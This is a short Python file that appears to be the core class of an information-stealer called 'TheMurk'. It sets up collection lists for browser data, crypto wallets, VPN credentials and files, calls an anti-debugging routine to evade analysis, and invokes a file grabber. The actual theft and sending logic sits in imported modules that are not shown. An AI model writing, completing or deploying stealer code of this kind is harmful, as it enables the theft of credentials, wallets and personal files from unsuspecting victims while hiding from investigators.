from preferences.config import *
from manager.antiDebug import AntiDebug
from manager.folders import Folders
from targets.files.files import TxtFiles
from targets.files.file_grabber import Grab

class TheMurk:
    def __init__(self) -> None:
        self.MainVars()
    
    def MainVars(self):
        self.name = ''
        self.password = ''
        self.np = []
        self.msgSys = ""
        self.msgBrowsers =[]
        self.msgOther =[]
        self.msgWallets =[]
        self.msgFiles = []
        self.msgVPN = []
    
    def Progress(self):
        self.Start()

    def Start(self):
        if not config.debuging:
            AntiDebug(config.oneStart)
        Folders(config.enableFileGrabber)
    
    def GrabFiles(self):
        if config.enableFileGrabber:
            self.msgFiles = Grab(self.msgFiles)
        else:
            TxtFiles()